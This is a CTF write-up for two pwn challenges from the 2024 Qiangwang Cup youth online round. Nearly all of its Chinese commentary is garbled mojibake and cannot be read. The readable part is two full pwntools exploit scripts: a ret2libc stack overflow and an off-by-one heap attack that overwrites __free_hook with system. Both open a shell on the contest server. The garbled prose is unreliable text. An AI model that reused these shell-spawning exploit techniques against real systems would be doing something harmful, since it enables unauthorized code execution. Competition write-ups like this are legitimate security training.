export const layout = "#components/Page.js";
export const title = "2024 å¼ºç½‘æ¯é’å°‘èµ›çº¿ä¸Šèµ›é¢˜è§£";
export const created = "2024-11-25T16:55:35+08:00";

# 2024 å¼ºç½‘æ¯é’å°‘èµ›çº¿ä¸Šèµ›é¢˜è§£

## å‰è¨€

æˆ˜é˜Ÿåï¼šcrazyNAN

æˆ˜é˜Ÿæ’åï¼š6

æˆ˜é˜Ÿæ•´ä½“ç­”é¢˜æƒ…å†µï¼šé™¤ web æ–¹å‘ cyberboard mysqlprobe å¤–å‡è§£å‡ºã€‚

è¿™è¾ˆå­æœ€åä¸€æ¬¡æ‰“å¼ºç½‘æ¯é’å°‘èµ›äº†ï¼Œå› ä¸ºæˆ‘ä»Šå¹´åˆšæ»¡ 18 å²ï¼ˆï¼ˆï¼ˆ

ä¸€å¼€å§‹æŠŠè¿™äº‹æƒ…éƒ½å¿˜äº†ï¼Œè¿˜æ˜¯ Aura å¸ˆå‚…æ‹‰æˆ‘æˆ‘æ‰æƒ³èµ·æ¥ï¼Œæ‰“ç€ç©ç©ï¼Œè¯åˆè¯´å›æ¥åˆèµ›å’Œè¿™ b Aura æœ‰ä¸ªğŸ¥šçš„å…³ç³»å•Šï¼ˆï¼ˆ

å…¨é  ğŸ‘´ å’Œ ğŸŒ³ å¸¦é£ï¼ˆ

~~æ‚é±¼ Aura~~

## Wp

èµ›æ—¶å¼€äº†ä¸ªé£ä¹¦äº‘æ–‡æ¡£ï¼Œè¾¹æ‰“è¾¹å†™ wpï¼Œæ„Ÿè§‰ç¡®å®ä¸é”™ï¼Œä¸ç”¨èµ›åä¸“é—¨æ•´ç† wp äº†ã€‚

æˆ‘è¿™é‡Œå°±æŠŠæˆ‘åšçš„ pwn é¢˜å‘ä¸€ä¸‹ï¼Œå‰©ä¸‹çš„å¯ä»¥æˆ³è¿™ä¸ªé“¾æ¥çœ‹ [exp](https://bvx4hy6im9l.feishu.cn/wiki/LvdCwgCyniqVfWkRdEzc9UAvn2g?from=from_copylink)

### Pwn

#### clock_in

æ¿å­ ret2libcï¼Œexp:

```python
from pwn import *
from sys import argv

proc = "./clock_in"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
libc = ELF("./libc.so.6")
io = remote("101.200.61.16", 34841) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io, "b *0x401252")

io.recvuntil(": \n")
pop_rdi_ret = 0x4011C5
get_info_addr = 0x401202
ret = 0x000000000040101a
payload1 = b'a' * 64 + b'b' * 8 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(get_info_addr)
io.sendline(payload1)
io.recvuntil(b"\x40\n")
puts_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + next(libc.search(b"/bin/sh"))
log.info(f"libc_addr => {hex(libc_addr)}\nsystem_addr => {hex(system_addr)}")

payload2 = flat([b'a' * (64 + 8), pop_rdi_ret, binsh_addr, ret, system_addr])
io.recvuntil(b": \n")
io.sendline(payload2)
io.interactive()
```

#### journey_story

off by oneï¼Œlibc2.31 çš„èœå•é¢˜ï¼Œèµ›æ—¶å‘ç°å’Œ 22 å¹´å¹¿ä¸œçœèµ›çš„é¢˜æ¯”è¾ƒåƒï¼Œæ­£å¥½åšè¿‡ï¼Œç¿»äº†ä¸‹æœ¬åœ° exp æ‹¿æ¥å°±æ‰“

```python
from pwn import *
from sys import argv

proc = "./journey_story"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("101.200.61.16", 20595) if argv[1] == 'r' else process(proc)
libc = ELF("./libc-2.31.so")

if args.G:
    gdb.attach(io)


def add_entry(size, content):
    io.recvuntil("Choose an option: ")
    io.sendline(b"1")
    io.recvuntil(b": ")
    io.sendline(hex(size).encode())
    io.sendline(content)


def delete_entry(index):
    io.recvuntil("Choose an option: ")
    io.sendline(b"2")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())


def update_entry(index, content):
    io.recvuntil("Choose an option: ")
    io.sendline(b"3")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())
    io.sendline(content)


def view_entries():
    io.recvuntil("Choose an option: ")
    io.sendline(b"4")


for i in range(7):
    add_entry(0xb0, b"aaaa")
for i in range(7):
    delete_entry(i)
for i in range(6):
    add_entry(0x28, b"aaaa")

update_entry(0, b'b' * 0x28 + b"\xc1")
delete_entry(1)
add_entry(0x28, b"eeee")
view_entries()

io.recvuntil(b"Story 2 (size 0x28): ", drop=True)
libc_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x1ecbe0
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']
log.info(f"libc_base => {hex(libc_base)}\nfree_hook => {hex(free_hook)}\nsystem_addr => {hex(system_addr)}")

for i in range(3):
    add_entry(0x28, (chr(65 + i) * 4).encode())

delete_entry(2)
delete_entry(3)
view_entries()
io.recvuntil(b"Story 7 (size 0x28): ", drop=True)

update_entry(7, p64(free_hook) + b"\n")
add_entry(0x28, b"kkkk")
add_entry(0x28, p64(system_addr))
add_entry(0xb0, b"/bin/sh\x00")
add_entry(0xb0, "test")
delete_entry(9)

io.interactive()
```

## é—²èŠ

åˆèµ›é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä¸»è¦æ˜¯æƒ³å»æ²³å—é€›ä¸€åœˆï¼ˆ

æ¯”èµ›æ˜¯å¥½æ¯”èµ›ï¼Œåˆå¿ƒæ˜¯å¥½çš„ï¼Œåªæ˜¯ py æœ‰ç‚¹ä¸¥é‡ï¼ŒåŸºæœ¬ä¸Šå…¨æ˜¯ä»£æ‰“ã€‚æˆ‘çœŸä¸ä¿¡æŸä¸ªå¤§å­¦çš„ä¸‰æ”¯é˜Ÿä¼åŒåˆ†åŒæ’åå…¨æ˜¯è‡ªå·±æ‰“çš„ï¼Œä½†æ˜¯ä»Šå¹´æ²¡æœ‰è¦æ±‚å½•å±ï¼Œå’¸é±¼ flag å–çƒ‚äº†ä¹Ÿæ˜¯æ­£å¸¸çš„å§ï¼ˆ

æœ‰ç‚¹æ¶å¿ƒå“ˆ

![pyç›´æ¥å‘expå•Šå“¥](https://pic.imgdb.cn/item/67443f4588c538a9b5bba2c3.jpg)

æ€ªä¸å¾—å››ç‚¹å¤šç¾¤é‡Œå¼€å§‹ç¦è¨€äº†ï¼Œæ‚å¤§å®¶å˜´æ˜¯å§ã€‚

é—¹éº»äº†ã€‚
